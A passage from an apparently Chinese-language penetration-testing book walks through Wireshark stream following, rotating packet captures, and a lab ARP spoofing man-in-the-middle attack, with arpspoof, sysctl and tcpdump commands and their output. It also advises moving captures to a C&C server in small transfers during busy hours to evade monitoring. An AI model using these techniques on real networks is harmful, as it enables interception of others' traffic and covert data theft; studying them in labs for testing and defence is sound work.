

![](img/095df2cd1930baecbcecaa51ee3417aa_117_0.png)

如果我突出显示一个数据包并查看数据包详细信息窗格，我可以看到该数据包的所有详细信息。在下面的屏幕截图中，我展开了 IP 和 TCP 部分，以显示 Wireshark 中可见的信息类型：

![](img/095df2cd1930baecbcecaa51ee3417aa_117_1.png)

如果我突出显示一个数据包，并且只想查看它所属的流，我可以选择 **跟随** 流，然后选择 **TCP 流** 来显示完整的对话：

![](img/095df2cd1930baecbcecaa51ee3417aa_118_0.png)

点击跟随 TCP 流后，我可以在一个窗格中看到整个对话。由于这是一次 HTTP 对话，我可以看到所有的 GET 请求以及 HTTP 响应。这对于故障排除和收集有关服务器的信息也非常有用。接下来，我们可以看到可以根据 HTTP 响应确定操作系统厂商以及 Web 服务器平台：

![](img/095df2cd1930baecbcecaa51ee3417aa_119_0.png)

捕获文件时另一个非常实用的选项是自动文件轮转。当与我们的 C&C 服务器结合使用时，这可能非常有用。您可以运行捕获，并使其每隔几秒或文件达到一定大小后创建新文件。这样，您就可以看到想要看到的一切，同时仍能将文件谨慎地传输到 C&C 服务器。请记住，为了尝试规避流量监控/异常系统，您需要确保文件传输量小且在组织的典型繁忙时段内：

![](img/095df2cd1930baecbcecaa51ee3417aa_120_0.png)

## 理解欺骗攻击

当无法物理上在线路中间时，如何在对话之间插入的最佳方式是什么？当然是通过欺骗攻击。欺骗攻击是中间人攻击，通常称为 man-in-the-middle，或在对话之间进行攻击的基本要求。欺骗攻击在其最简单的形式中，就是冒充其他事物，以便进入该对话的中间，或者如果冒充默认网关，则进入所有对话。

为完成此任务，我们将执行 ARP 欺骗。这将使我们能够告诉主机将其流量发送给我们作为默认网关，并告诉默认网关将流量发送给该主机发送给我们。这样，我们就可以将自己置于对话中间。一旦我们处于对话中间，我们不仅可以了解有关对话的信息，还可以操纵各种响应以从任一侧获取信息或发送恶意软件或其他类型的恶意程序。

下图以最简单的形式显示了 MiTM 攻击：

![](img/095df2cd1930baecbcecaa51ee3417aa_121_0.png)

## ARP 欺骗

现在我们对欺骗攻击有了了解，以及它们为何有用，让我们开始在一些主机对话之间插入。我将使用 ARP 欺骗来实现这一点。使用 `arpspoof` 命令，我可以用我的 MAC 地址毒害两边的 ARP 缓存，从而强制更改流量流。

要使用 Arpspoof，您需要确保它已安装。Arpspoof 是 dsniff 家族的一部分，因此如果您安装 dsniff（`apt-get install dsniff`），您也会获得 arpspoof。然而，在一切正常工作之前，您需要确保计划内联使用的设备上已启用 IP 转发。这是因为默认情况下，系统不会将该数据包转发回线路。为此，我只需通过 sysctl 进行更改：

```bash
sysctl -w net.ipv4.ip_forward=1
```

![](img/095df2cd1930baecbcecaa51ee3417aa_121_1.png)

我总是确保验证此更改是否生效。过去我曾因忘记启用它而受到惩罚，然后花费太多时间进行故障排除。快速而粗略的检查方法就是验证当前的 sysctl 设置：

```
root@kali:~# sysctl -a list | grep net.ipv4.ip_forward
net.ipv4.ip_forward = 1
```

![](img/095df2cd1930baecbcecaa51ee3417aa_122_0.png)

现在一切就绪，让我们玩得开心一些，将自己欺骗到一些流量流中。在我的实验室示例中，我将尝试拦截我的终端用户 192.168.33.4 与其互联网对话之间的通信。我还将在新放置的内联主机上运行 tcpdump，以确保我确实处于对话中，因为这对于我们接下来计划做的事情至关重要。

我需要打开多个终端来完成此任务。我将使用第一个终端，告诉默认网关（192.168.33.1）将发往终端主机的流量发送给我：

![](img/095df2cd1930baecbcecaa51ee3417aa_122_1.png)

在下一个窗口中，我需要告诉终端主机在发往默认网关时将其流量发送到我的内部主机：

```
root@pi-kali:~# arpspoof -i eth0 -t 192.168.33.3 192.168.33.1
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at b8:27:eb:6a:35:5f
^CCleaning up and re-arping targets...
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at e0:55:3d:77:4:b5
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at e0:55:3d:77:4:b5
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at e0:55:3d:77:4:b5
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at e0:55:3d:77:4:b5
b8:27:eb:6a:35:5f 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at e0:55:3d:77:4:b5
```

最后，在第三个窗口中，我将针对端口 80 运行 tcpdump，以验证我是否看到端口 80 上的双向流量：

```
root@pi-kali:~# tcpdump -n port 80
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
02:00:19.403762 IP 216.58.217.170.80 > 192.168.33.3.54481 Flags [.], ack 1268562255, win 341, options [nop,nop,TS val 3435422080 ecr 10383409495], length 0
02:00:19.403998 IP 216.58.217.170.80 > 192.168.33.3.54481 Flags [.], ack 1, win 341, options [nop,nop,TS val 3435422080 ecr 10383409495], length 0
02:00:22.211611 IP 207.172.61.182.80 > 192.168.33.3.54458 Flags [.], ack 1770686182, win 235, options [nop,nop,TS val 1609458199 ecr 1038968932], length 0
02:00:22.211851 IP 207.172.61.182.80 > 192.168.33.3.54458 Flags [.], ack 1, win 235, options [nop,nop,TS val 1609458199 ecr 1038968932], length 0
02:00:22.212130 IP 207.172.61.182.80 > 192.168.33.3.54455 Flags [.], ack 1855465261, win 235, options [nop,nop,TS val 1609458199 ecr 1038968686], length 0
02:00:22.212697 IP 207.172.61.182.80 > 192.168.33.3.54457 Flags [.], ack 1, win 235, options [nop,nop,TS val 1609458199 ecr 1038968686], length 0
02:00:22.212937 IP 207.172.61.182.80 > 192.168.33.3.54457 Flags [.], ack 99327793, win 235, options [nop,nop,TS val 1609458203 ecr 1038968682], length 0
02:00:22.215512 IP 207.172.61.182.80 > 192.168.33.3.54456 Flags [.], ack 1, win 235, options [nop,nop,TS val 1609458203 ecr 1038968682], length 0
02:00:31.781698 IP 192.168.33.3.54485 > 54.240.190.145.80: Flags [F.], seq 197637882, ack 3145427091, win 4096, options [nop,nop,TS val 1809131351 ecr 1480
040648], length 0
02:00:31.702626 IP 192.168.33.3.54485 > 54.240.190.145.80: Flags [F.], seq 0, ack 1, win 4096, options [nop,nop,TS val 1039131351 ecr 1402040648], length 0
02:00:31.702373 IP 192.168.33.3.54452 > 54.192.55.41.80: Flags [F.], seq 2974505158, ack 584427220, win 4096, options [nop,nop,TS val 1039131351 ecr 140204
0800], length 0
02:00:31.702628 IP 192.168.33.3.54452 > 54.192.55.41.80: Flags [F.], seq 0, ack 1, win 4096, options [nop,nop,TS val 1039131351 ecr 1402040808], length 0
02:00:31.702375 IP 192.168.33.3.54475 > 54.192.55.134.80: Flags [F.], seq 2373086167, ack 3816905065, win 4096, options [nop,nop,TS val 1039131351 ecr 1462
996288], length 0
02:00:31.703092 IP 192.168.33.3.54475 > 54.192.55.134.80: Flags [F.], seq 0, ack 1, win 4096, options [nop,nop,TS val 1039131351 ecr 1462966288], length 0
02:00:31.702377 IP 192.168.33.3.54474 > 54.192.55.134.80: Flags [F.], seq 3910605424, ack 3804258782, win 4096, options [nop,nop,TS val 1039131351 ecr 1398
438144], length 0
```

